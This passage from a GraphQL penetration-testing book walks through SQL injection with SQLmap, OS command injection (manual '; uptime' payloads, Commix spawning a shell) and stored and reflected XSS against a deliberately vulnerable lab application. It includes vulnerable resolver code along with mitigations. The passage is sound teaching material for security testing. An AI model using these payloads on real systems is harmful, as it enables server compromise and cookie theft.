<p>In this example, SQLmap will replace the asterisk with entries from its database of SQLi payloads.</p>
<p>SQLmap can read full HTTP requests from a file. We can take any HTTP request and feed it into SQLmap, which will then read the query and use it to execute SQL. <a href="#figure8-10" id="figureanchor8-10">Figure 8-10</a> shows how to save a request to a file in Burp Suite. Right-click anywhere in the request window and select <b>Copy to File</b>. Name the file <em>request.txt</em> and save it.</p>
<span epub:type="pagebreak" id="Page_204" title="204"/><figure>
<img alt="" class="keyline" src="image_fi/502840c08/f08010.png"/>
<figcaption><p><a id="figure8-10">Figure 8-10</a>: Saving an HTTP request from Burp Suite to a file</p></figcaption>
</figure>
<p>Next, run SQLmap by using the <code class="bold">-r</code> (request) argument to specify the file. Set the target database engine argument (<code class="bold">--dbms</code>) to <code class="bold">sqlite</code>. By providing a database engine name, we narrow the number of tests executed to only the relevant subset and speed up the process of injection testing. <a href="#listing8-3" id="listinganchor8-3">Listing 8-3</a> shows how to run the command.</p>
<pre><code># <b>sqlmap -r request.txt —dbms=sqlite —tables</b>

[14:30:53] [INFO] parsing HTTP request from 'request.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] <b>Y</b>

JSON data found in POST body. Do you want to process it? [Y/n/q] <b>n</b>

[14:30:55] [INFO] testing connection to the target URL
it is recommended to perform only basic UNION tests if there is not at least one
other (potential) technique found. Do you want to reduce the number of requests? [Y/n] <b>Y</b>

[14:30:57] [INFO] testing 'Generic UNION query (NULL) — 1 to 10 columns'
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the
others (if any)? [y/N] <b>N</b>

Parameter: #1* ((custom) POST)
    Type: UNION query
    Title: Generic UNION query (NULL) — 1 column
    Payload: {"query":"query getPastes {\n        pastes(filter:\"test' UNION ALL
SELECT CHAR(113,122,98,122,113)||CHAR(102,90,76,111,106,97,117,117,105,113,101,121,
72,117,112,87,114,99,114,65,99,86,84,120,72,69,115,122,120,77,121,119,122,103,108,
116,87,100,114,82)||CHAR(113,122,98,98,113),NULL,NULL,NULL,NULL,NULL,NULL,
NULL—bGJM\") {\n          id\n          title\n          content\n
ipAddr\n          userAgent\n          owner {\n            name\n
}\n          }\n        }"}</code></pre>
<p class="CodeListingCaption"><a id="listing8-3">Listing 8-3</a>: A SQLmap successful injection output</p>
<p><span epub:type="pagebreak" id="Page_205" title="205"/>SQLmap notifies us that it found our asterisk marker (<code>*</code>) and asks whether we want to process it. Enter <code class="bold">Y</code>. The tool then indicates that it found JSON data within our <em>request.txt</em> file and asks whether it should interpret it as JSON. Enter <code class="bold">N</code>, as GraphQL syntax could confuse SQLmap. Next, it suggests reducing the number of requests and using only a basic <code>UNION</code> test. Enter <code class="bold">Y</code>. The test found that our parameter was vulnerable, so enter <code class="bold">N</code> to instruct SQLmap not to execute any more tests. The tool also highlights the payload that led to a successful injection.</p>
<p>Now we can gather information about the database by using the <code class="bold">--tables</code> argument, which will list the database tables in DVGA, as shown in <a href="#listing8-4" id="listinganchor8-4">Listing 8-4</a>.</p>
<pre><code># <b>sqlmap -r request.txt --dbms=sqlite --tables</b>

[14:34:05] [INFO] fetching tables for database: 'SQLite_masterdb'
&lt;current&gt;
[5 tables]
+------------+
| audits     |
| owners     |
| pastes     |
| servermode |
| users      |
+------------</code></pre>
<p class="CodeListingCaption"><a id="listing8-4">Listing 8-4</a>: Using SQLmap to list tables in the DVGA database</p>
<p>As you can see, we’ve returned tables for the various components in DVGA. Great job! We were able to identify a SQL injection vulnerability both manually and automatically.</p>
<h2 id="h1-502840c08-0005"><a class="XrefDestination" id="OperatingSystemCommandInjection"/><span class="XrefDestination" id="xref-502840c08-019"/>Operating System Command Injection</h2>
<p class="BodyFirst"><em>Operating system (OS) command injection</em> vulnerabilities are injections that impact the application’s underlying operating system, and they happen when user input is inserted into a system shell command. This allows us to introduce additional parameters or break out of the designated command and run one that we control.</p>
<p>Much like SQLi, OS command injection could have severe consequences for an application, allowing attackers to do things such as the following:</p>
<ul class="disc">
<li>Enumerate local services, processes, users, and groups</li>
<li>Exfiltrate local filesystem files, such as sensitive configuration files, database files, and so on</li>
<li>Gain remote access by making the server call back to our remote shell</li>
<li>Turn the server into an attack launchpad using specialized malware</li>
<li>Turn the server into a crypto-miner</li>
</ul>
<p>OS command injections could effectively allow us to perform system administration tasks on the server, often within the context of the web <span epub:type="pagebreak" id="Page_206" title="206"/>application user. Web servers are often running under Unix accounts such as <em>www-data</em>, <em>apache</em>, <em>nginx</em>, or, if we get very lucky, the <em>root</em> user.</p>
<p>Applications are often designed to use system shell libraries to perform backend tasks. For instance, an application might need to check whether a remote server is alive by using the <code>ping</code> command or download files by using the <code>wget</code> command. It might also compress files by using commands such as <code>zip</code>, <code>tar</code>, or <code>gunzip</code> or back up filesystems by using commands such as <code>cp</code> or <code>rsync</code>.</p>
<p>The mere use of system utilities does not necessarily indicate the presence of OS command injection vulnerabilities, but if the system utility commands run by the application can be influenced by arbitrary user input, things can get dangerous. When performing source code review, look for the following imported libraries and functions, and see if their commands are constructed using custom user input:</p>
<ul class="disc">
<li>Python libraries such as <em>subprocess</em> and <em>os</em> and functions like <code>exec</code> and <code>eval</code></li>
<li>PHP functions such as <code>system</code>, <code>shell_exec</code>, <code>eval</code>, and <code>exec</code></li>
<li>Java functions such as <code>Runtime.exec()</code></li>
<li>Node.js modules such as <code>child_process</code> and functions like <code>exec</code> and <code>spawn</code></li>
</ul>
<h3 id="h2-502840c08-0011"><a class="XrefDestination" id="AnOSCommandInjectionExample"/><span class="XrefDestination" id="xref-502840c08-020"/>An Example</h3>
<p class="BodyFirst">Imagine that an application lets a user supply a URL, then downloads a file from that URL into its own filesystem. Consider the following function in Flask, a web framework written in Python, as an example:</p>
<pre><code>@app.route('/download', methods=['POST'])
def download():
  <span aria-label="annotation1" class="CodeAnnotationCode">❶</span> url = request.form['url']
  <span aria-label="annotation2" class="CodeAnnotationCode">❷</span> os.system('wget {} -P /data/downloads'.format(url))
    return redirect('/dashboard')</code></pre>
<p>This code snippet is a Python web application route that exposes an endpoint called <em>/download</em>. This endpoint supports requests coming in via the HTTP POST method.</p>
<p>At <span aria-label="annotation1" class="CodeAnnotation">❶</span>, the application takes user input submitted through an HTML form on the website and assigns it to the <code>url</code> variable. At <span aria-label="annotation2" class="CodeAnnotation">❷</span>, the <code>url</code> variable is used in the context of a <code>wget</code> command, effectively allowing <code>wget</code> to download the file by using the <code>url</code> variable. The downloaded file is then stored under the <em>/data/downloads</em> folder on the server’s filesystem. As a result, if a client provides a URL such as <em>http://example.com/file.zip</em>, the web application will execute the following shell command:</p>
<pre><code>wget http://example.com/file.zip -P /data/downloads</code></pre>
<p>Multiple problems exist here. First, the application allows any URL to be supplied. No checks are in place to verify that the input is even in a valid URL format. Second, a client could supply internal URLs or private IP addresses as a way to identify and reach internal restricted resources, which <span epub:type="pagebreak" id="Page_207" title="207"/>can also lead to <em>server-side request forgery (SSRF)</em> vulnerabilities (more on SSRF vulnerabilities in <span class="xref" itemid="xref_target_Chapter 9">Chapter 9</span>). In addition, since the application inserts the client input directly into the <code>wget</code> command, we could introduce any shell command we desire. We could also use the semicolon (<code>;</code>) character to break or separate the <code>wget</code> command and start a new command, effectively performing an OS command injection. This could lead to complete server compromise.</p>
<h3 id="h2-502840c08-0012"><a class="XrefDestination" id="ManualOSCommandInjectionTestinginDVGA"/><span class="XrefDestination" id="xref-502840c08-021"/>Manual Testing in DVGA</h3>
<p class="BodyFirst">In GraphQL, OS command injection can happen if a resolver function accepts arguments from a GraphQL field without implementing the necessary verifications on the input. Let’s explore what this looks like in DVGA.</p>
<p>Returning to the schema documentation we reviewed earlier, we have four fields of interest, which all start with the word <code>system</code>: <code>systemUpdate</code>, <code>systemHealth</code>, <code>systemDiagnostics</code>, and <code>systemDebug</code>. While field names can differ from one application to another, the word <code>system</code> often hints at the use of system shell commands under the hood, so exploring those for OS command injections is worthwhile.</p>
<p>If you’ve ever performed a penetration test on your home router, you’ll know that its debug or diagnostics page is probably the most interesting place to look for impactful vulnerabilities. OS command injections often exist in these interfaces, as they use network utilities such as <code>ping</code> or <code>traceroute</code> under the hood. Home routers aren’t particularly famous for their security; they hardly ever check input for dangerous characters and are often vulnerable to OS command injection.</p>
<p>In this section, we’ll focus on <code>systemDebug</code>. Run the following in Altair to see the kind of response we get:</p>
<pre><code><b>query {</b>
<b>  systemDebug</b>
<b>}</b></code></pre>
<p>If you’ve done a bit of Linux system administration, you may recognize the following output excerpt; it comes from the <code>ps</code> command, which displays information about running system and user processes:</p>
<pre><code>"systemDebug": "    PID TTY          TIME CMD\n  11999 pts/1    00:00:00 bash\n
14050 pts/1    00:00:00 python3\n  14055 pts/1    00:00:03 python3\n  14135 pts/1
00:00:00 sh\n  14136 pts/1    00:00:00 ps\n"</code></pre>
<p>Open the <b>Docs</b> page in Altair. Under Queries, you’ll notice that <code>systemDebug</code> takes a single argument, named <code>arg</code>, of type <code>String</code>, which seems promising. Does the GraphQL query resolver send this argument directly to the <code>ps</code> command? Let’s find out:</p>
<pre><code><b>query {</b>
<b>  systemDebug(arg:"ef")</b>
<b>}</b></code></pre>
<p><span epub:type="pagebreak" id="Page_208" title="208"/>Now the output looks a little different. This is because <code>e</code> and <code>f</code> are two valid arguments that the <code>ps</code> command accepts and that change the output’s format. The <code>e</code> argument shows all processes on the system, while <code>f</code> changes the output format to a full-format listing.</p>
<p>It looks as though the <code>arg</code> argument takes our input and concatenates it with the <code>ps</code> command. We can attempt to introduce our own command by modifying <code>arg</code> to include the semicolon character (<code>;</code>), followed by another Linux command of our choice, such as <code>uptime</code>:</p>
<pre><code><b>query {</b>
<b>  systemDebug(arg:"; uptime")</b>
<b>}</b></code></pre>
<p>Now we get different output. It seems to include system information from the GraphQL server, confirming our hypothesis that OS command injection is possible:</p>
<pre><code>PID TTY          TIME CMD\n  11999 pts/1    00:00:00 bash\n  14050 pts/1
1 user,  load average: 0.71, 0.84, 0.91\n"</code></pre>
<p>Next, we will explore how to test for OS command injection a bit more effectively by utilizing specialized command-injection frameworks.</p>
<h3 id="h2-502840c08-0013"><a class="XrefDestination" id="AutomatedOSCommandInjectionTestingwithCommix"/><span class="XrefDestination" id="xref-502840c08-022"/>Automated Testing with Commix</h3>
<p class="BodyFirst">So far, we’ve used a manual approach to identifying OS command injection vulnerabilities. Sometimes, however, these vulnerabilities won’t be as straightforward to find and exploit. For example, some applications may restrict the types of characters they accept, making it harder to inject commands into places such as query arguments. Alternatively, a firewall between us and the target GraphQL API could block dangerous characters from being accepted. These security controls make it difficult to identify holes by using a manual testing approach, which is time-consuming.</p>
<p>Automating command injection helps test many character variations until we find the right logic. For example, command injections can happen by introducing any of the following characters, among others:</p>
<ul class="disc">
<li>A semicolon (<code>;</code>) to separate commands</li>
<li>A single ampersand (<code>&amp;</code>) to send the first command to the background and continue to a second command we introduced</li>
<li>A double ampersand (<code>&amp;&amp;</code>) to run a second command after the first command finishes successfully (returns <code>true</code>), acting as an AND condition</li>
<li>A double pipe (<code>||</code>) to run a second command after the first command finishes unsuccessfully (returns <code>false</code>), acting as an OR condition</li>
</ul>
<p>By using automated injection tools, we can test many of these characters with little to no effort.</p>
<p><em>Commix</em> is a cross-platform OS command injection framework capable of finding and exploiting these vulnerabilities in applications. Commix does its magic by fuzzing various application inputs and inspecting the <span epub:type="pagebreak" id="Page_209" title="209"/>server responses for patterns that indicate a successful injection. Commix can also identify successful injection attempts through inference, such as by adding delays to commands and timing the response through the use of <code>sleep</code>.</p>
<p>Let’s take another look at the GraphQL <code>systemDebug</code> field, which allowed us to inject OS commands through its <code>arg</code> argument. Imagine that, in a penetration test, we haven’t identified how to exploit the application in a timely manner yet think there might be something there to explore. We can use Commix to scale our attack by attempting dozens of payload variations and save valuable time.</p>
<p>The Commix command in <a href="#listing8-5" id="listinganchor8-5">Listing 8-5</a> shows how to run an injection test against our target application:</p>
<pre><code># <b>commix --url="http://127.0.0.1:5013/graphql"</b>
<b>--data='{"query":"query{systemDebug(arg:\"test \")}"}' -p arg</b>

[info] Testing connection to the target URL.
You have not declared cookie(s), while server wants to set its own.


Do you want to use those [Y/n] &gt; <b>Y</b>
[info] Performing identification checks to the target URL.
Do you recognize the server's operating system? [(W)indows/(U)nix/(q)uit] &gt;<b> U</b>
JSON data found in POST data. Do you want to process it? [Y/n] &gt; <b>Y</b>
It appears that the value 'query{systemDebug(arg:\"test\")}' has boundaries.
Do you want to inject inside? [Y/n] &gt; <b>Y</b>

[info] Testing the (results-based) classic command injection technique.
[info] <b>The POST (JSON) parameter 'arg' seems injectable</b> via (results-based)
classic command injection technique.
       |_ echo UTKFLI$((13+45))$(echo UTKFLI)UTKFLI

Do you want a Pseudo-Terminal shell? [Y/n] &gt; <b>Y</b>
Pseudo-Terminal (type '?' for available options)

commix(os_shell) &gt;<b> ls</b>

__pycache__ app.py config.py core db dvga.db pastes requirements.txt
setup.py static templates version.py</code></pre>
<p class="CodeListingCaption"><a id="listing8-5">Listing 8-5</a>: A successful GraphQL OS command injection with Commix</p>
<p>We specify the GraphQL target URL <em>http://localhost:5013/graphql</em> by using the GraphQL query <code>systemDebug</code> along with the <code>arg</code> argument. We then use the <code>-p</code> flag to signal to Commix that it should inject the payloads at the specific <code>arg</code> placeholder.</p>
<p>Commix identifies that the server wants to set an HTTP cookie. We accept this by entering <code>Y</code> at the command line. Commix then needs to know the type of operating system the remote server is running so it can choose the relevant payloads from its database. For example, Linux servers require different injection payloads than Windows servers. We choose the Unix option by specifying the <code>U</code> character.</p>
<p><span epub:type="pagebreak" id="Page_210" title="210"/>Next, we indicate to Commix that it should process the JSON response coming from the GraphQL server. We specify that we want to inject payloads inside the command boundaries. Commix signals that it found the <code>arg</code> argument to be injectable. It identified this by inserting the <code>echo</code> command into it, along with a unique string. If the response contains this unique string, it means the code was successfully injected.</p>
<p>We spawn a pseudo shell in which to send Unix commands to the server. Lastly, we send the <code>ls</code> command to test that we can interact with the server by using our shell and list its files. We can see that a few files were listed, meaning we’ve successfully performed an OS command injection.</p>
<p>As you can see, Commix provides a very convenient way to run a series of injection tests against GraphQL APIs.</p>
<h3 id="h2-502840c08-0014"><a class="XrefDestination" id="CodeReviewofaResolverFunction"/><span class="XrefDestination" id="xref-502840c08-023"/>Code Review of a Resolver Function</h3>
<p class="BodyFirst">Let’s perform a code review of the resolver function for <code>systemDebug</code> to see how it is implemented in DVGA (<a href="#listing8-6" id="listinganchor8-6">Listing 8-6</a>). This should help us better understand the root cause of the OS command injection vulnerability we discovered.</p>
<pre><code>def resolve_system_debug(self, info, arg=None):
  Audit.create_audit_entry(info)
  if arg:
    output = helpers.run_cmd('ps {}'.format(arg))
  else:
    output = helpers.run_cmd('ps')
  return output</code></pre>
<p class="CodeListingCaption"><a id="listing8-6">Listing 8-6</a>: The resolver function in DVGA</p>
<p>The <code>resolve_system_debug()</code> Python function handles the GraphQL field <code>systemDebug</code>. It accepts a single, optional argument named <code>arg</code>. A default value of <code>None</code> is set if the client hasn’t set the argument in the query.</p>
<p>Within this function, the <code>helpers.run_cmd()</code> function runs the <code>ps</code> system shell command, which is concatenated with the <code>arg</code> value if it is not <code>None</code>. If the client provides the argument <code>ef</code>, the command effectively becomes the following:</p>
<pre><code>output = helpers.run_cmd('ps ef')</code></pre>
<p>If the client hasn’t supplied any value to the <code>arg</code> argument, the function simply runs the command <code>ps</code> on its own, returning the list of running processes on the system.</p>
<p>The vulnerability here is that there are no security checks on the supplied argument <code>arg</code>, so the resolver function will execute any Linux command it receives. This can be mitigated in multiple ways:</p>
<ul class="disc">
<li>Accepting only alphabetic characters (<code>a</code> to <code>z</code>) and ensuring that these are valid <code>ps</code> arguments</li>
<li>Removing any dangerous characters that could allow an attacker to introduce additional commands</li>
<li><span epub:type="pagebreak" id="Page_211" title="211"/>Running the command as an unprivileged user to reduce the risk if an injection is possible</li>
<li>Using dedicated built-in libraries instead of shell commands directly, such as the <em>psutil</em> library in Python

<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	The website GTFOBins (<a class="LinkURL" href="https://gtfobins.github.io">https://gtfobins.github.io</a>) is a useful resource when performing OS command injections. If you can partially or fully control a binary through a GraphQL API, you can look up the binary name in the GTFOBins database to see how it can be abused for breaking out of shells or escalating privileges.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside></li>
</ul>
<p>So far, we covered injection vulnerabilities that, when present, impact the server. Next, we will explore a few injection vulnerabilities that impact clients.</p>
<h2 id="h1-502840c08-0006"><a class="XrefDestination" id="Cross-SiteScripting"/><span class="XrefDestination" id="xref-502840c08-024"/>Cross-Site Scripting</h2>
<p class="BodyFirst">Injection vulnerabilities can also impact clients. Imagine a Profile Update page on a social media website that allows users to change their full name and bio. If the application doesn’t perform any security validations on this input, we could try to use some GraphQL mutation to submit malicious JavaScript code to the page and have it render on other clients’ browsers whenever they visit our profile. The ability to execute JavaScript on a client’s browser is powerful, because it allows us to exfiltrate browser information such as cookies to a remote server and obtain access to sensitive session tokens that could hijack a client’s session.</p>
<p><em>Cross-site scripting (XSS)</em> vulnerabilities happen when client-side code (such as JavaScript) gets interpreted and executed within the context of a web browser. This type of vulnerability has been reported since the 1990s, yet we still see it today, more than 30 years later.</p>
<p>If you are already familiar with XSS vulnerabilities, you’ll find that they aren’t very different in GraphQL than in other API technologies such as REST. This section provides a brief explanation of the main types of XSS vulnerabilities: reflected, stored, and DOM based. Then we’ll explore XSS vulnerabilities in DVGA so you can gain experience identifying them in GraphQL APIs.</p>
<h3 id="h2-502840c08-0015"><a class="XrefDestination" id="ReflectedXSS"/><span class="XrefDestination" id="xref-502840c08-025"/>Reflected XSS</h3>
<p class="BodyFirst">Perhaps the simplest of all XSS vulnerabilities, <em>reflected XSS</em> occurs when input is submitted to the server and returned in an immediate response to the client, such as in HTML error messages or within an HTML page’s content.</p>
<p>From an attacker standpoint, exploiting a reflected XSS vulnerability requires social engineering the victim into clicking a link that triggers the XSS payload, causing the attacker’s JavaScript code to run in the victim’s browser.</p>
<p><span epub:type="pagebreak" id="Page_212" title="212"/>In the context of GraphQL, a query vulnerable to reflected XSS might look like the following:</p>
<pre><code>query {
   hello(msg:"Black Hat GraphQL")
}</code></pre>
<p>This <code>hello</code> operation takes a <code>msg</code> parameter that accepts input from a client—in this case, the string <code>Black</code> <code>Hat</code> <code>GraphQL</code>. When a client submits this information, the server will render the page and perhaps print a message such as <code>Hello Black Hat GraphQL!</code></p>
<p>Now, imagine that we change the <code>msg</code> parameter value to a JavaScript payload:</p>
<pre><code>query {
   hello(msg:"&lt;script&gt;document.cookie;&lt;/script&gt;")
}</code></pre>
<p>When this gets rendered in the client’s browser, the <code>&lt;script&gt;</code> tag will instruct the browser to call the <code>document</code> JavaScript object and print the <code>cookie</code> string. Cookies will often include information related to the session, such as identifiers.</p>
<p>Because this information isn’t stored in any database on the server, but rather is reflected back to the client in the response upon submitting the query, the XSS is of a reflection type. We could improve the payload by having the victim’s browser send its cookie to a remote server under our control, allowing us to exfiltrate the user’s cookies.</p>
<p>We mentioned earlier that this attack would require social engineering to be useful. For example, via a phishing email, we could send the victim a URL containing our malicious JavaScript payload and wait until they click it.</p>
<p>You might be asking yourself, how would this work when using POST requests? Well, earlier in the book we mentioned that GraphQL may support GET-based queries, so you could attempt to construct a link such as the following and test whether the target GraphQL server supports GET-based queries:</p>
<pre><code>http://example.com/graphql?query=query%20%7B%0A%20%20hello(msg%3A%22hello%22)%0A%7D</code></pre>
<p>This URL, when decoded, looks like the following:</p>
<pre><code>http://example.com/graphql?query=query {
  hello(msg:"hello")
}</code></pre>
<p>GraphQL APIs that support GET-based queries will accept a <code>query</code> GET parameter, followed by the query syntax. The query operation can be a query or a mutation. A victim clicking this link would submit a GraphQL query using a GET request. In <span class="xref" itemid="xref_target_Chapter 9">Chapter 9</span>, you will learn about how GET-based queries can also be leveraged to carry cross-site request forgery (CSRF) attacks.</p>
<h3 id="h2-502840c08-0016"><span epub:type="pagebreak" id="Page_213" title="213"/><a class="XrefDestination" id="StoredXSS"/><span class="XrefDestination" id="xref-502840c08-026"/>Stored XSS</h3>
<p class="BodyFirst">In <em>stored</em>, or <em>persistent</em>,<em> XSS</em>, the injection payload is persisted to a datastore, such as a database, rather than reflected to the client as part of a response to a query. Thus, unlike reflected XSS, a stored XSS vulnerability will trigger the injected script every time the client’s browser loads a page containing the malicious payload.</p>
<p>Often, stored XSS vulnerabilities are considered more dangerous than reflected XSS. The existence of the XSS payload in an application’s datastore could pose a risk to other systems, such as these:</p>
<ul class="disc">
<li>Other servers reading the malicious input from the same datastore as the GraphQL application. These are effectively impacted by the same exploit.</li>
<li>Other flows within the same GraphQL application reading from the same datastore. The exploit would impact other parts of the application and therefore affect other clients.</li>
</ul>
<p><a href="#figure8-11" id="figureanchor8-11">Figure 8-11</a> shows how a stored XSS could impact other systems.</p>
<figure>
<img alt="" class="" src="image_fi/502840c08/F08011.png"/>
<figcaption><p><a id="figure8-11">Figure 8-11</a>: A stored XSS vulnerability impacting adjacent applications</p></figcaption>
</figure>
<p>Our malicious input could traverse many devices and resources on a network; after first hitting the GraphQL API layer, it could be inserted into different datastores, such as a cache database, a relational database, or a local file.</p>
<p>From there, we won’t always know whether the exploitation attempt worked. Often we need to wait until something (or someone) triggers our payload. Imagine that we use a GraphQL mutation to send a JavaScript payload and then don’t receive any indication that it was successfully rendered by the application as JavaScript code. Several explanations are possible. For example, we may have injected the payload into a database table that’s read only by someone with a different level of access to the application.</p>
<p>Contact forms provide a good example. Say you submit a payload in a feedback form to a store from which you recently bought an item and <span epub:type="pagebreak" id="Page_214" title="214"/>get a <code>Thank you for your submission</code> message. Even though you received no indication that the exploitation attempt was successful, your attack was not necessarily a dead end. The payload might get triggered only after the store opens the feedback form. This could happen days or even weeks later. We call these hidden attacks <em>blind XSS</em>, a subcategory of stored XSS.</p>
<p>To take advantage of blind XSS vulnerabilities, you can use tools that generate unique payloads with which to test. When an XSS vulnerability is found and the payload is triggered, the payload will send probes to a centralized server for further inspection, allowing you to capture information about the client on which the payload was executed. One such tool is <em>XSS Hunter</em> (<a class="LinkURL" href="https://xsshunter.com">https://xsshunter.com</a>). Tools that notify you whenever your XSS payload triggers are pretty convenient.</p>
<h3 id="h2-502840c08-0017"><a class="XrefDestination" id="DOM-BasedXSS"/><span class="XrefDestination" id="xref-502840c08-027"/>DOM-Based XSS</h3>
<p class="BodyFirst"><em>Document Object Model–based XSS</em>, or <em>DOM-based</em>, vulnerabilities occur when a JavaScript injection payload gets executed exclusively within the browser’s DOM. The DOM is a representation of a web document that allows applications to modify their structure, content, and style. All HTML objects can be manipulated using the DOM API.</p>
<p>For example, the document object can be used to get the HTML <code>&lt;title&gt;</code> tag in a web page. In DVGA’s web interface, open your browser’s developer tools and enter the command <code class="bold">document.title</code> in the <b>Console</b> tab. You should see the following result:</p>
<pre><code># <b>document.title</b>

'Damn Vulnerable GraphQL Application'</code></pre>
<p>While reflected XSS and stored XSS result from vulnerabilities that exist in server-side code, DOM XSS vulnerabilities usually stem from a vulnerability in the frontend application code facing the client. For example, it can happen when malicious input can be inserted (often as part of a URL) and passed to a component that supports dynamic code execution, like JavaScript’s <code>eval</code> function.</p>
<p>Because DOM XSS vulnerabilities happen in client-side code, GraphQL APIs aren’t the root cause of such vulnerabilities. Despite this fact, we believe it’s important to be aware of them, as community-built GraphQL clients could be vulnerable to these types of vulnerabilities. For a comprehensive list of the available GraphQL client libraries, visit <a class="LinkURL" href="https://graphql.org/code/#javascript-client">https://graphql.org/code/#javascript-client</a>.</p>
<h3 id="h2-502840c08-0018"><a class="XrefDestination" id="TestingforXSSinDVGA"/><span class="XrefDestination" id="xref-502840c08-028"/>Testing for XSS in DVGA</h3>
<p class="BodyFirst">In this section, we will use DVGA’s user interface to perform XSS testing. Numerous XSS vulnerabilities are implemented into DVGA, so we can achieve XSS in more than one way. We’ll explore a few techniques to get you comfortable with using GraphQL queries for XSS testing.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<span epub:type="pagebreak" id="Page_215" title="215"/><h2><span class="NoteHead">NOTE</span></h2>
<p>	This section requires you to insert JavaScript payloads into DVGA that could interfere with its web interface. Don’t worry; there’s a way to undo it all. Restore DVGA to its last-known good state by clicking the user icon and then choosing <b>Rollback DVGA</b>. This will rebuild the database and reload the application. Alternatively, you can take a virtual machine snapshot and restore it whenever required.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>Open your web browser in the lab and navigate to DVGA’s main interface at <b><i>http://localhost:5013</i></b>.</p>
<h4 id="h3-502840c08-0003"><a class="XrefDestination" id="TamperingwiththeAuditPage"/><span class="XrefDestination" id="xref-502840c08-029"/>Tampering with the Audit Page</h4>
<p class="BodyFirst">As a first step, click some of the pages on the left sidebar, such as Public Pastes. Your browser will start sending GraphQL queries to populate the web page with information. Next, click the user icon at the top right; then click <b>Audit</b>. You should be able to see audit events listed, as shown in <a href="#figure8-12" id="figureanchor8-12">Figure 8-12</a>.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c08/f08012.png"/>
<figcaption><p><a id="figure8-12">Figure 8-12</a>: The audit trail in DVGA</p></figcaption>
</figure>
<p>This Audit page suggests that the application is automatically tracking every query the browser sent while we were browsing the page, gathering information such as the following:</p>
<ul class="disc">
<li>The name of the actor or <em>user</em> (in this case, <em>DVGAUser</em>)</li>
<li>The name of the <em>GraphQL operation</em> that was used (in this case, <em>getPastes</em>)</li>
<li>The <em>executed query</em> (in this case, the <code>pastes</code> GraphQL field used with the <code>public</code> argument and a few selected fields, such as <code>id</code>, <code>title</code>, and<code> content</code>)</li>
</ul>
<p>This input is fully under our control. Let’s first explore how we can tamper with the GraphQL operation to impact the Audit page. Copy and paste the following query into Altair and run it:</p>
<pre><code><b>mutation SpoofedOperationName {</b>
<b>  createPaste(title:"Black Hat GraphQL", content:"I just spoofed the operation name.") {</b>
<b>    paste {</b>
<span epub:type="pagebreak" id="Page_216" title="216"/><b>      content</b>
<b>      title</b>
<b>    }</b>
<b>  }</b>
<b>}</b></code></pre>
<p>The mutation creates a new paste with the title <code>Black Hat GraphQL</code> and content <code>I just spoofed the operation name</code>. At the same time, we return the newly created paste’s <code>content</code> and <code>title</code> fields, which should have identical values.</p>
<p>Refresh the Audit page. You should be able to see that it now shows our spoofed operation name <code>SpoofedOperationName</code> under the GraphQL Operation column, as shown in <a href="#figure8-13" id="figureanchor8-13">Figure 8-13</a>. This is what a security analyst might see if attempting to monitor GraphQL queries using operation names.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c08/f08013.png"/>
<figcaption><p><a id="figure8-13">Figure 8-13</a>: The Audit page showing the modified operation name in DVGA</p></figcaption>
</figure>
<p>As we mentioned earlier, different GraphQL server implementations may allow operation names to include special characters, which could be an injection vector, so always test these whenever possible.</p>
<h4 id="h3-502840c08-0004"><a class="XrefDestination" id="FindingStoredXSSintheCreatePasteMutation"/><span class="XrefDestination" id="xref-502840c08-030"/>Finding Stored XSS in the CreatePaste Mutation</h4>
<p class="BodyFirst">When we create a new paste in DVGA, the GraphQL fields used in our <code>createPaste</code> mutation, such as <code>title</code> and <code>content</code>, are shown on the Public Pastes page. The screenshot in <a href="#figure8-14" id="figureanchor8-14">Figure 8-14</a> shows what this looks like.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c08/f08014.png"/>
<figcaption><p><a id="figure8-14">Figure 8-14</a>: Paste structure and contents in DVGA</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_217" title="217"/>As you can see, our paste shows up on the web page. This is a good opportunity to start testing the <code>createPaste</code> field with inputs such as JavaScript code to see whether the data is safely rendered in the web interface.</p>
<p>Go ahead and create a new paste using the mutation query shown in <a href="#listing8-7" id="listinganchor8-7">Listing 8-7</a>.</p>
<pre><code>mutation {
  createPaste(title:"XSS", content:"&lt;script&gt;alert(\"XSS\")&lt;/script&gt;") {
    paste {
      title
      content
    }
  }
}</code></pre>
<p class="CodeListingCaption"><a id="listing8-7">Listing 8-7</a>: Injecting an XSS payload using the <code>createPaste</code> mutation</p>
<p>This mutation creates a new paste that includes a JavaScript <code>&lt;script&gt;</code> tag in the <code>content</code> argument. If the application is vulnerable to XSS, this code will get rendered in the browser and an alert message box will pop up with the message <code>XSS</code>. After sending this mutation query, head over to the <b>Public Pastes</b> page. You should be greeted with a pop-up message, as shown in <a href="#figure8-15" id="figureanchor8-15">Figure 8-15</a>.</p>
<figure>
<img alt="" class="" src="image_fi/502840c08/f08015.png"/>
<figcaption><p><a id="figure8-15">Figure 8-15</a>: An XSS payload triggered via a malicious mutation</p></figcaption>
</figure>
<p>Let’s walk through what happened here. We first created a new paste using <code>createPaste</code>, supplying a malicious JavaScript payload to the mutation’s <code>content</code> argument. The API then stored the new paste in the database. Because our client is using a GraphQL subscription operation over the WebSocket protocol, and since subscriptions are real time, we immediately see the new paste we created containing the malicious JavaScript code. This is an example of a stored XSS vulnerability.</p>
<h4 id="h3-502840c08-0005"><span epub:type="pagebreak" id="Page_218" title="218"/><a class="XrefDestination" id="FindingReflectedXSSintheFileUploadFunctionality"/><span class="XrefDestination" id="xref-502840c08-031"/>Finding Reflected XSS in the File Upload Functionality</h4>
<p class="BodyFirst">Now we’ll explore the creation of a new paste using a file upload functionality. This should give you a sense of how file uploads look in GraphQL and whether they could be vulnerable to XSS. Download the following text file to your computer: <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch08/paste_from_file.txt">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch08/paste_from_file.txt</a>.</p>
